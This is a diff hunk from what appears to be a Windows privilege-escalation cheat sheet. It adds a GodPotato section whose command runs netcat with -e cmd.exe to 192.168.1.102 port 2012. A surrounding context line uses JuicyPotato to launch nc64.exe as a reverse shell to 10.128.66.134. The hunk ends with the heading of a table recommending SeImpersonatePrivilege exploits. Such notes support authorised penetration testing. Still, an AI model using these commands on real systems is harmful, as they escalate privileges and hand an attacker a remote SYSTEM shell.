@@ -597,6 +597,14 @@ Get the netcat exe from: https://github.com/int0x33/nc.exe/
 .\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\bruce\Desktop\nc64.exe 10.128.66.134 5555 -e cmd.exe" -t "*" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
 ```
 
+## Get GodPotato
+
+Link: https://github.com/BeichenDream/GodPotato?source=post_page-----10b91a94c580---------------------------------------
+
+```
+GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
+```
+
 ##  SeImpersonatePrivilege Exploit Cheat Sheet
 
 | Windows Version                              | Recommended Exploit |
